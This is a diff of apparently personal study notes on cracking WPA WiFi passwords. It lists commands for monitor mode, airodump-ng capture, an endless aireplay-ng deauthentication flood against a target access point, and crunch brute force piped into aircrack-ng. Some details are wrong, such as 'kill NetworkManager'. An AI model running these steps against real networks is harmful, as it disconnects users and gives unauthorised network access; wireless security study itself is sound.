@@ -30,7 +30,7 @@ Mac filtering is turned off
 ##### Decryption with "aircrack-ng" & "aircrack-ptw"  
 1. `sudo aircrack-ng <file_name>.cap`  
 2. `./aircrack-ptw <file_name>.cap`  
-`crunch 10 10 -t %%%%%%%123 | aircrack-ng -w - SCAN-test.cap -e <essid>`
+`crunch 10 10 -t %%%%%%%123 | aircrack-ng -w - SCAN-test.cap -e <essid>`   
 [Aircrack-ng](http://aircrack-ng.org/doku.php?id=aircrack-ng)
 https://www.aircrack-ng.org/doku.php?id=cracking_wpa  
 
@@ -45,4 +45,25 @@ Aircrack-PTW:
 ```
 
 #### from video  
+##### change wifi card from promiscuous to monitor mode.  
+1. `ifconfig`  
+2. `ifconfig wlan0 down`  
+3. `iwconfig wlan0 mode monitor`  
+4. `ifconfig wlan0 up`
+##### check airmon-ng is good to go
+5. `airmon-ng check wlan0`  
+6. kill processes that are running.  `kill NetworkManager`  
+##### run airodump-ng
+7. `airodump-ng wlan0`  
+8. `airodump-ng --channel 1 --bssid 12:34:45:45:67:80 --write SCAN_test wlan0`  
+*NEW TERMINAL*  this authenticates all clients on network - 0 means just goes on forever.  let it run for a while  
+9. `aireplay-ng -0 0 -a 12:34:45:45:56:88 wlan0`  
+10. ctr ^ C to stop  
+11. one first terminal check to see if wpa handshake is captured.  if so stop capture.  
+*FRESH TERMINAL*  
+12. `crunch 10 10 -t @@@@@@@@@@ | aircrack-ng -w - SCAN_test-01.cap -e <essid>`  
+##### try using a list cd crunch-3.6 find charset.lst 
+13. `crunch 10 10 -t @@@@@@@@@@ -f charset.lst mixalpha-numeric-space`  
+
+# REAVER 
 
